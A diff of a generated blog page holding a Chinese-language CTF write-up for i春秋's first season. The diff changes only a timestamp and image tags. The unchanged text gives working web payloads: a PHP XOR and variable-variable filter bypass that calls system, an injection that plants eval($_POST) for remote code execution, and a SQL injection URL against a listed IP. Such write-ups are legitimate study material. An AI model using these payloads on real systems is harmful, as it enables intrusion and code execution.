@@ -19,7 +19,7 @@
 <meta property="og:image" content="http://yoursite.com/.com//4.png">
 <meta property="og:image" content="http://yoursite.com/.com//5.png">
 <meta property="og:image" content="http://yoursite.com/.com//6.png">
-<meta property="og:updated_time" content="2019-09-20T12:25:09.772Z">
+<meta property="og:updated_time" content="2019-09-20T12:31:00.914Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="i春秋CTF夺旗赛(第一季)">
 <meta name="twitter:description" content="i春秋CTF夺旗赛(第一季) WEBmath2019国赛线上赛的加强版，ban掉了base_convert,dechex无法通过进制转换造出来字母了mt_rand^23==&amp;gt;_G和rand^75==&amp;gt;ET异或构造出来_G和ET利用PHP的可变变量使得$pi=&amp;quot;_GET&amp;quot;变为$pi=&amp;quot;$_GET再利用php的{}内也可执行payload 1c=$pi=(is">
@@ -147,10 +147,10 @@
 
   <div class="content" itemprop="articleBody">
     <h1 id="i春秋CTF夺旗赛-第一季"><a href="#i春秋CTF夺旗赛-第一季" class="headerlink" title="i春秋CTF夺旗赛(第一季)"></a>i春秋CTF夺旗赛(第一季)</h1><hr>
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><p>2019国赛线上赛的加强版，ban掉了<code>base_convert</code>,<code>dechex</code>无法通过进制转换造出来字母了<br><img src="/.com//1.png" alt="2" style="zoom:50%;"><br><code>mt_rand^23==&gt;_G</code>和<code>rand^75==&gt;ET</code>异或构造出来<code>_G</code>和<code>ET</code><br><img src="/.com//2.png" alt="2" style="zoom:50%;"><br><img src="/.com//3.png" style="zoom:50%;"><br>利用PHP的可变变量使得<code>$pi=&quot;_GET&quot;</code>变为<code>$pi=&quot;$_GET</code><br>再利用php的<code>{}</code>内也可执行<br><img src="/.com//4.png" style="zoom:50%;"><br><img src="/.com//5.png" style="zoom:50%;"><br>payload</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><p>2019国赛线上赛的加强版，ban掉了<code>base_convert</code>,<code>dechex</code>无法通过进制转换造出来字母了<br><img src="/.com//1.png" alt><br><code>mt_rand^23==&gt;_G</code>和<code>rand^75==&gt;ET</code>异或构造出来<code>_G</code>和<code>ET</code><br><img src="/.com//2.png" alt><br><img src="/.com//3.png" alt><br>利用PHP的可变变量使得<code>$pi=&quot;_GET&quot;</code>变为<code>$pi=&quot;$_GET</code><br>再利用php的<code>{}</code>内也可执行<br><img src="/.com//4.png" alt><br><img src="/.com//5.png" alt><br>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=(is_nan^(6).(4)).(rand^(7).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls /</span><br></pre></td></tr></table></figure>
 
-<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>源码泄露index.php.bak<br><img src="/.com//6.png" style="zoom:50%;"><br>直接构造闭合<code>&#39;);payload//</code><br>payload<code>http://url/?file=.%27)===eval($_POST[&quot;a&quot;]);//</code></p>
+<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>源码泄露index.php.bak<br><img src="/.com//6.png" alt><br>直接构造闭合<code>&#39;);payload//</code><br>payload<code>http://url/?file=.%27)===eval($_POST[&quot;a&quot;]);//</code></p>
 <h3 id="crypto-rsa"><a href="#crypto-rsa" class="headerlink" title="crypto-rsa"></a>crypto-rsa</h3><p>i 春秋环境炸裂</p>
 <h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>i 春秋环境炸裂<br>前面SQL注入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.106.94.18:13004/login.php?username=admin\&amp;passwd=||passwd/**/regexp/**/&quot;1&quot;;%00</span><br></pre></td></tr></table></figure>
